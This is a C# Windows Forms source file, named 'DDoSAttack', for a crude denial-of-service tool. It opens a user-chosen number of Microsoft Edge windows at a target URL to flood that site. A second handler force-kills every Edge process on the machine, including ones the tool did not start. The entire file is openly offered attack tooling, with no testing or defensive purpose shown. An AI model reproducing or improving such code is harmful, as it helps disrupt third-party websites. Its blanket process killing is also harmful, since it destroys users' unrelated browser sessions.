using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Windows.Forms;

namespace DDoSAttack
{
    public partial class Form1 : Form
    {
        private List<Process> browserProcesses = new List<Process>();

        public Form1()
        {
            InitializeComponent();
        }

        private void button1_Click(object sender, EventArgs e)
        {
            if (int.TryParse(textBox2.Text, out int numberOfBrowsers) && Uri.TryCreate(textBox1.Text, UriKind.Absolute, out Uri targetUri))
            {
                for (int i = 0; i < numberOfBrowsers; i++)
                {
                    Process process = new Process();
                    process.StartInfo = new ProcessStartInfo("msedge.exe", targetUri.ToString())
                    {
                        UseShellExecute = true
                    };
                    process.Start();
                    browserProcesses.Add(process);
                }
            }
            else
            {
                MessageBox.Show("Please enter valid values for browsers and URL.", "Invalid Input", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private void button2_Click(object sender, EventArgs e)
        {
            int closedCount = 0;
            List<string> errors = new List<string>();

            foreach (var process in browserProcesses)
            {
                try
                {
                    if (!process.HasExited)
                    {
                        process.Kill();
                        closedCount++;
                    }
                }
                catch (Exception ex)
                {
                    errors.Add($"Error closing tracked process: {ex.Message}");
                }
            }

            try
            {
                var edgeProcesses = Process.GetProcessesByName("msedge");
                foreach (var edgeProcess in edgeProcesses)
                {
                    try
                    {
                        edgeProcess.Kill();
                        closedCount++;
                    }
                    catch (Exception ex)
                    {
                        if (!ex.Message.Contains("Access is denied") && !ex.Message.Contains("has exited"))
                        {
                            errors.Add($"Error closing fallback process: {ex.Message}");
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                errors.Add($"Error closing processes by name: {ex.Message}");
            }

            browserProcesses.Clear();

            string errorMessage = string.Join("\n", errors);
            if (errors.Count > 0)
            {
                MessageBox.Show(errorMessage, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }

        }

        private void label1_Click(object sender, EventArgs e)
        {
            // No implementation needed for label click event
        }

        private void label3_Click(object sender, EventArgs e)
        {
            // No implementation needed for label click event
        }

        private void Form1_Load(object sender, EventArgs e)
        {

        }
    }
}
